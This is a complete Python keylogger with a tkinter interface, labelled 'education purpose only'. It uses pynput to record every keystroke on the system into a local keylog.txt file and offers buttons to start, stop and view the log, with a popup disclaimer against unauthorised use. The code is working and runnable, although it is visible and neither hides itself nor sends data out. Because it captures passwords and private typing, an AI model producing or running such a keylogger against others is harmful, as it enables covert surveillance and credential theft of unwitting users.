import tkinter as tk
from tkinter import messagebox, scrolledtext
from pynput import keyboard
import threading
import os

log_file = "keylog.txt"
listener = None
is_listening = False

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f"[{key}]")

def start_keylogger():
    global listener, is_listening
    if is_listening:
        messagebox.showinfo("Running", "Keylogger is already running.")
        return
    is_listening = True
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    status_label.config(text="🟢 Logging started")

def stop_keylogger():
    global listener, is_listening
    if not is_listening:
        messagebox.showinfo("Not running", "Keylogger is not running.")
        return
    if listener:
        listener.stop()
        listener = None
    is_listening = False
    status_label.config(text="🔴 Logging stopped")

def view_logs():
    if not os.path.exists(log_file):
        messagebox.showinfo("No Logs", "No keylog.txt file found.")
        return
    with open(log_file, "r") as f:
        content = f.read()

    log_window = tk.Toplevel(root)
    log_window.title("Logs")
    log_window.configure(bg="black")
    log_window.geometry("600x400")

    log_text = scrolledtext.ScrolledText(log_window, wrap=tk.WORD, font=("Consolas", 10),
                                         bg="black", fg="#00ffff", insertbackground="#00ffff")
    log_text.insert(tk.END, content)
    log_text.pack(expand=True, fill="both")
    log_text.configure(state="disabled")

def show_disclaimer():
    messagebox.showwarning(
        "⚠️ Ethical Use Only",
        "This tool is built for EDUCATIONAL PURPOSES ONLY.\n"
        "Do NOT use this software on systems without permission.\n"
        "You are responsible for your actions."
    )

root = tk.Tk()
root.title("Keylogger (education purpose only)")
root.geometry("500x400")
root.configure(bg="black")

tk.Label(root, text="Keylogger (education purpose only)", fg="#00ffff", bg="black",
         font=("Consolas", 16, "bold")).pack(pady=10)

button_frame = tk.Frame(root, bg="black")
button_frame.pack(pady=20)

tk.Button(button_frame, text="▶️ Start Logging", command=start_keylogger,
          bg="#001f33", fg="#00ffff", font=("Consolas", 12), width=18).grid(row=0, column=0, padx=10)

tk.Button(button_frame, text="⏹️ Stop Logging", command=stop_keylogger,
          bg="#001f33", fg="#00ffff", font=("Consolas", 12), width=18).grid(row=0, column=1, padx=10)

tk.Button(root, text="📄 View Logs", command=view_logs,
          bg="#003344", fg="#00ffff", font=("Consolas", 12), width=40).pack(pady=10)

status_label = tk.Label(root, text="Awaiting action...", fg="#00ffff", bg="black",
                        font=("Consolas", 10))
status_label.pack(pady=10)

root.after(500, show_disclaimer)

root.mainloop()
